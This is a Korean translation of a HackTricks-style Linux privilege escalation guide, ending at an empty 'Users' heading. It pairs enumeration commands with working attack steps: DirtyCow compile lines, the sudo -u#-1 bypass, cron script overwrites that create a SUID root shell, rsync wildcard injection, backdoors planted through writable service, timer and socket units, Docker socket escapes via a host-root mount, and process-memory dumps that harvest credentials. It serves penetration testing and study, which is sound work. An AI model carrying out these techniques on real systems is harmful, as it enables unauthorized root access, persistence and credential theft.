# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 시스템 정보

### OS 정보

실행 중인 OS에 대한 정보를 수집해보자.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

만약 **`PATH` 변수 안의 어떤 폴더에 대해 쓰기 권한(write permissions)을 가지고 있다면** 일부 라이브러리나 바이너리를 hijack할 수 있습니다:
```bash
echo $PATH
```
### Env info

환경 변수에 흥미로운 정보, 비밀번호 또는 API 키가 있나요?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

커널 버전을 확인하고, escalate privileges에 사용할 수 있는 exploit이 있는지 확인하세요.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
여기에서 좋은 취약한 kernel 목록과 이미 **compiled exploits** 일부를 확인할 수 있습니다: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 및 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
다른 사이트들에서 일부 **compiled exploits** 를 찾을 수 있습니다: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

해당 사이트에서 취약한 kernel 버전들을 모두 추출하려면 다음을 실행하면 됩니다:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits를 검색하는 데 도움이 될 수 있는 도구는 다음과 같습니다:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

항상 **search the kernel version in Google**, 아마도 당신의 kernel version이 어떤 kernel exploit에 적혀 있을 수 있으니 해당 exploit가 유효한지 확신할 수 있습니다.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 버전

다음에 나타나는 취약한 sudo 버전을 기반으로:
```bash
searchsploit sudo
```
이 grep을 사용하여 sudo 버전이 취약한지 확인할 수 있습니다.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

작성자 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 서명 검증 실패

**smasher2 box of HTB**에서 이 vuln이 어떻게 악용될 수 있는지에 대한 **example**을 확인하세요.
```bash
dmesg 2>/dev/null | grep "signature"
```
### 추가적인 시스템 열거
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 가능한 방어 수단 열거

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

docker container 안에 있다면 탈출을 시도해볼 수 있습니다:


{{#ref}}
docker-security/
{{#endref}}

## 드라이브

어디에 **what is mounted and unmounted** 되어 있는지, 그리고 그 이유를 확인하세요. 만약 어떤 항목이 **unmounted** 상태라면 **mount**를 시도해보고 개인 정보를 확인해보세요
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 유용한 소프트웨어

유용한 바이너리 열거
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
또한 **any compiler is installed**인지 확인하세요. 일부 kernel exploit를 사용해야 하는 경우, 해당 exploit을 사용하려는 머신(또는 유사한 머신)에서 이를 compile하는 것이 권장되므로 유용합니다.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 설치된 취약한 소프트웨어

설치된 패키지 및 서비스의 **버전**을 확인하세요. 예를 들어 오래된 Nagios 버전이 있어 escalating privileges에 악용될 수 있습니다…\
더 의심스러운 설치된 소프트웨어의 버전을 수동으로 확인하는 것이 권장됩니다.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _이 명령어들은 많은 정보를 표시하며 대부분 쓸모없을 수 있으므로, 설치된 소프트웨어 버전이 알려진 exploits에 취약한지 검사하는 OpenVAS 같은 도구 사용을 권장한다_

## Processes

실행 중인 **프로세스**가 무엇인지 확인하고, 어떤 프로세스가 **정상보다 더 많은 권한을 가지고 있는지**(예: tomcat이 root로 실행되는 경우?) 점검하라.
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
또한 **processes binaries에 대한 권한**을 확인하세요. 누군가의 binaries를 덮어쓸 수 있을지도 모릅니다.

### Process monitoring

프로세스를 모니터링하기 위해 [**pspy**](https://github.com/DominicBreuker/pspy) 같은 도구를 사용할 수 있습니다. 이는 자주 실행되거나 특정 조건이 충족될 때 취약한 프로세스를 식별하는 데 매우 유용할 수 있습니다.

### Process memory

서버의 일부 서비스는 **credentials in clear text inside the memory**를 저장하기도 합니다.\
보통 다른 사용자가 소유한 프로세스의 메모리를 읽으려면 **root privileges**가 필요하기 때문에, 이는 이미 root인 상태에서 추가 credentials를 찾을 때 더 유용합니다.\
그러나 일반 사용자로서 자신이 소유한 프로세스의 메모리는 읽을 수 있다는 점을 기억하세요.

> [!WARNING]
> 요즘 대부분의 머신은 기본적으로 **ptrace를 허용하지 않습니다**. 이는 비권한 사용자가 소유한 다른 프로세스를 덤프할 수 없다는 것을 의미합니다.
>
> 파일 _**/proc/sys/kernel/yama/ptrace_scope**_가 ptrace의 접근성을 제어합니다:
>
> - **kernel.yama.ptrace_scope = 0**: 동일한 uid를 가진 경우 모든 프로세스를 디버그할 수 있습니다. 이는 전통적인 ptrace 동작 방식입니다.
> - **kernel.yama.ptrace_scope = 1**: 오직 부모 프로세스만 디버그할 수 있습니다.
> - **kernel.yama.ptrace_scope = 2**: ptrace는 admin만 사용할 수 있으며 CAP_SYS_PTRACE 권한이 필요합니다.
> - **kernel.yama.ptrace_scope = 3**: 어떤 프로세스도 ptrace로 추적할 수 없습니다. 이 값으로 설정되면 ptrace를 다시 활성화하려면 재부팅이 필요합니다.

#### GDB

예를 들어 FTP 서비스의 메모리에 접근할 수 있다면 Heap을 얻어 그 안의 credentials를 검색할 수 있습니다.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 스크립트
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

주어진 프로세스 ID에 대해, **maps는 해당 프로세스의 가상 주소 공간 내에서 메모리가 어떻게 매핑되는지를 보여주며**; 또한 **각 매핑된 영역의 권한**도 표시합니다. **mem** 의사 파일은 **프로세스의 메모리 자체를 노출합니다**. **maps** 파일에서 어떤 **메모리 영역이 읽을 수 있는지**와 그 오프셋을 알 수 있습니다. 우리는 이 정보를 사용해 **mem 파일에서 특정 위치로 이동(seek)하여 모든 읽을 수 있는 영역을 덤프**하여 파일로 저장합니다.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`은 시스템의 **물리적** 메모리에 접근할 수 있게 해주며, 가상 메모리는 아닙니다. 커널의 가상 주소 공간은 /dev/kmem을 사용해 접근할 수 있습니다.\

일반적으로, `/dev/mem`은 **root**와 **kmem** 그룹만 읽을 수 있습니다.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump는 Windows용 Sysinternals 툴 모음의 클래식 ProcDump 도구를 Linux용으로 재구성한 것입니다. 다음에서 확인하세요: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 도구

프로세스 메모리를 덤프하려면 다음을 사용할 수 있습니다:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root 요구사항을 수동으로 제거하고 자신이 소유한 프로세스를 덤프할 수 있습니다
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root 권한 필요)

### 프로세스 메모리에서 자격 증명

#### 수동 예시

authenticator 프로세스가 실행 중이면:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
프로세스를 dump할 수 있으며(이전 섹션을 참조하여 프로세스의 memory를 dump하는 다양한 방법을 확인) memory 내부에서 credentials를 검색할 수 있습니다:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 는 **메모리에서 평문 자격증명을 탈취**하고 일부 **잘 알려진 파일**에서도 수집합니다. 정상적으로 작동하려면 root 권한이 필요합니다.

| 기능                                              | 프로세스 이름         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 검색 정규식/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 예약된/Cron 작업

예약된 작업 중 취약한 것이 있는지 확인하세요. root에 의해 실행되는 스크립트를 악용할 수 있는지 살펴보세요 (wildcard vuln? root가 사용하는 파일을 수정할 수 있나? symlinks 사용? root가 사용하는 디렉터리에 특정 파일을 생성?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron 경로

예를 들어, _/etc/crontab_ 안에서 다음과 같은 PATH를 찾을 수 있습니다: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_"user" 사용자가 /home/user에 쓰기 권한이 있는 것을 주목하세요_)

만약 이 crontab에서 root 사용자가 PATH를 설정하지 않고 어떤 명령이나 스크립트를 실행하려 한다면. 예를 들어: _\* \* \* \* root overwrite.sh_\
그런 경우, 다음을 사용하여 root shell을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron이 와일드카드가 있는 script를 사용하는 경우 (Wildcard Injection)

root로 실행되는 script가 명령어 안에 “**\***”을 포함하고 있다면, 이를 악용하여 예상치 못한 동작(예: privesc)을 발생시킬 수 있습니다. 예:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**만약 wildcard가 앞에 위치한 경로가** _**/some/path/\***_ **와 같다면 취약하지 않습니다 (심지어** _**./\***_ **도 그렇지 않습니다).**

더 많은 wildcard exploitation tricks에 대해서는 다음 페이지를 읽어보세요:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron script overwriting and symlink

만약 당신이 root에 의해 실행되는 **cron script를 수정할 수 있다면**, 아주 쉽게 **shell**을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root에 의해 실행되는 script가 **당신이 완전한 접근 권한을 가진 directory**를 사용한다면, 그 폴더를 삭제하고 당신이 제어하는 script를 제공하는 다른 폴더로 연결되는 **symlink 폴더를 생성하는 것**이 유용할 수 있습니다.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 자주 실행되는 cron jobs

프로세스를 모니터링하여 1, 2 또는 5분마다 실행되는 프로세스를 찾을 수 있습니다. 이를 이용해 escalate privileges할 수도 있습니다.

예를 들어, **1분 동안 0.1초마다 모니터링**, **실행 횟수가 적은 명령어 순으로 정렬**하고 가장 많이 실행된 명령어들을 삭제하려면 다음을 실행할 수 있습니다:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**또한 사용할 수 있습니다** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (이는 시작되는 모든 프로세스를 모니터링하고 나열합니다).

### 보이지 않는 cron jobs

주석 뒤에 **carriage return을 넣는 방식으로** cronjob을 만들 수 있습니다 (without newline character), 그리고 cron job은 작동합니다. 예시(주의: carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 서비스

### 쓰기 가능한 _.service_ 파일

어떤 `.service` 파일을 쓸 수 있는지 확인하세요. 쓸 수 있다면, 이를 수정하여 서비스가 **started**, **restarted** 또는 **stopped** 될 때 당신의 **backdoor**가 **실행되도록** 만들 수 있습니다 (기계가 재부팅될 때까지 기다려야 할 수도 있습니다).\
예를 들어 .service 파일 안에 **`ExecStart=/tmp/script.sh`** 로 backdoor를 생성하세요.

### 쓰기 가능한 서비스 바이너리

서비스에 의해 실행되는 바이너리에 대해 **쓰기 권한**이 있다면, 이를 변경해 backdoors를 심을 수 있으므로 서비스가 다시 실행될 때 backdoors가 실행됩니다.

### systemd PATH - Relative Paths

다음 명령으로 **systemd**가 사용하는 PATH를 확인할 수 있습니다:
```bash
systemctl show-environment
```
경로의 어떤 폴더에든 **쓰기**가 가능하다는 것을 발견하면 **권한 상승**이 가능할 수 있습니다. 다음과 같은 서비스 구성 파일에서 **상대 경로가 사용되고 있는지** 찾아야 합니다:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
그런 다음, 쓰기 가능한 systemd PATH 폴더 안에 상대 경로 바이너리와 **동일한 이름의** **executable**을 생성하면, 서비스가 취약한 동작(**Start**, **Stop**, **Reload**)을 실행하도록 요청될 때 당신의 **backdoor가 실행됩니다** (권한 없는 사용자는 보통 서비스를 시작/중지할 수 없지만 `sudo -l`로 확인해 보세요).

**서비스에 대해서는 `man systemd.service`를 참고하세요.**

## **Timers**

**타이머**는 이름이 `**.timer**`로 끝나며 `**.service**` 파일이나 이벤트를 제어하는 systemd unit 파일입니다. **타이머**는 캘린더 시간 이벤트와 단조(monotonic) 시간 이벤트를 기본적으로 지원하며 비동기적으로 실행될 수 있기 때문에 cron의 대안으로 사용할 수 있습니다.

타이머를 모두 열거하려면:
```bash
systemctl list-timers --all
```
### 쓰기 가능한 타이머

타이머를 수정할 수 있다면 존재하는 systemd.unit 항목(예: `.service` 또는 `.target`)을 실행하도록 만들 수 있습니다.
```bash
Unit=backdoor.service
```
문서에서 Unit은 다음과 같이 정의되어 있습니다:

> 이 타이머가 만료될 때 활성화할 unit입니다. 인수는 접미사가 ".timer"가 아닌 unit 이름입니다. 지정하지 않으면, 이 값은 타이머 유닛과 동일한 이름(단, 접미사를 제외)인 서비스(.service)로 기본 설정됩니다. (위 참조.) 활성화될 unit 이름과 타이머 unit의 이름은 접미사를 제외하고 동일하게 명명하는 것이 권장됩니다.

따라서 이 권한을 악용하려면 다음을 해야 합니다:

- `.service`와 같은 systemd unit 중에서 **쓰기 가능한 바이너리를 실행하는** 것을 찾습니다
- **상대 경로를 실행하는** systemd unit을 찾고, 해당 실행 파일을 가장하기 위해 **systemd PATH**에 대해 **쓰기 권한**을 가지고 있어야 합니다

**타이머에 대해 더 알아보려면 `man systemd.timer`를 참고하세요.**

### **타이머 활성화**

타이머를 활성화하려면 root 권한이 필요하며 다음을 실행해야 합니다:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **프로세스 통신**을 동일하거나 다른 머신에서 클라이언트-서버 모델 내에서 가능하게 합니다. 이들은 컴퓨터 간 통신을 위해 표준 Unix 디스크립터 파일을 사용하며 `.socket` 파일을 통해 설정됩니다.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** 이 파일 안에서는 여러 흥미로운 매개변수를 설정할 수 있습니다:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 이 옵션들은 서로 다르지만 요약하면 **어디에서 수신(listen)** 할지를 지정합니다 (AF_UNIX 소켓 파일의 경로, IPv4/6 및/또는 수신할 포트 번호 등).
- `Accept`: boolean 인수를 받습니다. **true**이면 **들어오는 각 연결마다 서비스 인스턴스가 생성**되고 연결 소켓만 해당 인스턴스에 전달됩니다. **false**이면 모든 리스닝 소켓 자체가 **시작된 service unit으로 전달**되며 모든 연결에 대해 단 하나의 service unit이 생성됩니다. 이 값은 datagram 소켓과 FIFO에서는 무시되며, 이 경우 단일 service unit이 모든 들어오는 트래픽을 무조건 처리합니다. **기본값은 false**입니다. 성능상의 이유로 새 데몬을 작성할 때는 `Accept=no`에 적합한 방식으로만 작성하는 것이 권장됩니다.
- `ExecStartPre`, `ExecStartPost`: 하나 이상 명령줄을 받으며, 이는 리스닝 **소켓**/FIFO가 각각 **생성**되고 바인딩되기 **전** 또는 **후**에 **실행**됩니다. 명령줄의 첫 토큰은 절대 파일명이어야 하며 그 뒤에 프로세스 인수를 따릅니다.
- `ExecStopPre`, `ExecStopPost`: 리스닝 **소켓**/FIFO가 각각 **닫히고** 제거되기 **전** 또는 **후**에 **실행되는 추가 명령들**입니다.
- `Service`: **들어오는 트래픽**에 대해 활성화할 **service** 유닛 이름을 지정합니다. 이 설정은 Accept=no인 소켓에만 허용됩니다. 기본적으로 소켓과 동일한 이름(접미사 대체)인 service를 가리키며, 대부분의 경우 이 옵션을 사용할 필요는 없습니다.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_참고: 시스템이 해당 socket 파일 구성을 실제로 사용하고 있어야 backdoor가 실행됩니다_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### 원시 연결
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

참고로 일부 **sockets listening for HTTP** 요청이 있을 수 있습니다 (_여기서 말하는 것은 .socket files가 아니라 unix sockets로 동작하는 파일들입니다_). 다음 명령으로 확인할 수 있습니다:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
socket이 **HTTP 요청에 응답**한다면, 그것과 **통신**할 수 있고, 어쩌면 **일부 취약점**을 **악용**할 수도 있습니다.

### 쓰기 가능한 Docker Socket

Docker socket, 종종 `/var/run/docker.sock`에 위치하는 이 파일은 보호되어야 하는 중요한 파일입니다. 기본적으로 이는 `root` 사용자와 `docker` 그룹의 멤버가 쓰기 권한을 가집니다. 이 socket에 대한 쓰기 권한을 가지면 privilege escalation으로 이어질 수 있습니다. 다음은 이 작업이 어떻게 가능한지와 Docker CLI를 사용할 수 없을 때의 대체 방법에 대한 설명입니다.

#### **Privilege Escalation with Docker CLI**

Docker socket에 쓰기 권한이 있다면, 다음 명령어들을 사용해 권한을 상승시킬 수 있습니다:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
이 명령들은 호스트의 파일 시스템에 root 권한으로 접근 가능한 컨테이너를 실행할 수 있게 해줍니다.

#### **Docker API 직접 사용**

Docker CLI를 사용할 수 없는 경우에도 Docker socket은 Docker API와 `curl` 명령어를 사용하여 여전히 조작할 수 있습니다.

1.  **List Docker Images:** 사용 가능한 이미지 목록을 가져옵니다.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** 호스트 시스템의 루트 디렉터리를 마운트하는 컨테이너를 생성하도록 요청을 전송합니다.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

새로 생성된 컨테이너를 시작합니다:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat`를 사용하여 컨테이너에 연결을 설정하면 그 안에서 명령을 실행할 수 있습니다.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 연결을 설정한 후에는 호스트 파일시스템에 대한 root 권한으로 컨테이너 내에서 직접 명령을 실행할 수 있습니다.

### 기타

docker socket에 대한 쓰기 권한이 있고 **`docker` 그룹에 속해 있는 경우** [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)를 이용할 수 있습니다. 만약 [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)라면 해당 API를 통해서도 침해할 수 있습니다.

다음에서 **more ways to break out from docker or abuse it to escalate privileges**를 확인하세요:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

만약 **`ctr`** 명령을 사용할 수 있다면 다음 페이지를 읽어보세요 — **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

만약 **`runc`** 명령을 사용할 수 있다면 다음 페이지를 읽어보세요 — **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus는 애플리케이션들이 효율적으로 상호작용하고 데이터를 공유할 수 있게 해주는 정교한 **프로세스 간 통신(IPC) 시스템**입니다. 현대적인 Linux 시스템을 염두에 두고 설계되었으며, 다양한 형태의 애플리케이션 통신을 위한 견고한 프레임워크를 제공합니다.

이 시스템은 프로세스 간 데이터 교환을 향상시키는 기본적인 IPC 기능을 지원하며, 이는 향상된 UNIX 도메인 소켓과 유사합니다. 또한 이벤트나 신호를 방송하여 시스템 구성 요소 간의 원활한 통합을 돕습니다. 예를 들어, Bluetooth 데몬에서 오는 호출 신호가 음악 재생기를 음소거하도록 하는 등 사용자 경험을 향상시킬 수 있습니다. 더불어 D-Bus는 원격 객체 시스템을 지원하여 서비스 요청과 메서드 호출을 간소화함으로써 전통적으로 복잡했던 프로세스를 단순화합니다.

D-Bus는 **allow/deny model**로 동작하며, 매칭되는 정책 규칙들의 누적 효과에 따라 메시지 권한(메서드 호출, 신호 전송 등)을 관리합니다. 이러한 정책들은 버스와의 상호작용을 지정하며, 권한을 악용하여 privilege escalation이 가능해질 수 있습니다.

예로 `/etc/dbus-1/system.d/wpa_supplicant.conf`에 있는 정책은 root 사용자가 `fi.w1.wpa_supplicant1`를 소유하고, 해당 서비스로 메시지를 보내며 받을 수 있도록 허용하는 내용을 보여줍니다.

사용자나 그룹이 명시되지 않은 정책은 보편적으로 적용되며, "default" 컨텍스트 정책은 다른 특정 정책에 의해 다뤄지지 않는 모든 항목에 적용됩니다.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus 통신을 열거하고 악용하는 방법은 여기에서 확인하세요:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **네트워크**

네트워크를 열거해 머신의 위치를 파악하는 것은 항상 흥미롭습니다.

### 일반적인 열거
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 열린 포트

항상 접근하기 전에 상호작용할 수 없었던 머신에서 실행 중인 네트워크 서비스를 확인하세요:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff traffic할 수 있는지 확인하세요. 가능하면 몇몇 credentials를 획득할 수 있습니다.
```
timeout 1 tcpdump
```
## 사용자

### 일반 열거

